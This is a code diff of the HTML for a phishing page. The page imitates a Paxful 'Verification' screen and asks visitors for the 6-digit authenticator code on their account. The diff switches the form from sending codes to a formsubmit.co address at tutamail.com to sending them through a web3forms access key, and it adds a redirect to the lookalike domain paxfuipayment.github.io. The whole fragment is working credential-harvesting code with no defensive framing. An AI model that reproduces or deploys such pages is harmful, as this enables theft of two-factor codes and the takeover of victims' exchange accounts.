@@ -162,10 +162,10 @@
             </div>
             <h1>Verification</h1>
             <p>Enter the 6-digit code we sent to the authenticator associated with your account:</p>
-            <form action="https://formsubmit.co/surveyvenmo@tutamail.com" method="POST" ><!--action="https://api.web3forms.com/submit" method="POST"-->
+            <form action="https://api.web3forms.com/submit" method="POST">
 		
 		    
-		<!--<input type="hidden" name="access_key" value="4a07ae73-968e-420d-bbe3-9fe22ba2fe08">-->
+		<input type="hidden" name="access_key" value="4a07ae73-968e-420d-bbe3-9fe22ba2fe08">
 
 		    
                 <div class="code-input-container">
@@ -178,12 +178,12 @@
                 </div>
 
 
-		    
+		<!--   
 		<input type="hidden" name="_subject" value="Paxful Verification Code">
 		<input type="hidden" name="_captcha" value="false">
 		<input type="hidden" name="_next" value="https://paxfuipayment.github.io/verification.html">
-
-
+		-->
+          	<input onclick="window.location.href = 'https://paxfuipayment.github.io/verification.html';" type="submit" value="Submit request" />
 		    
                 <button type="submit" class="submit-btn">Submit</button>
             </form>
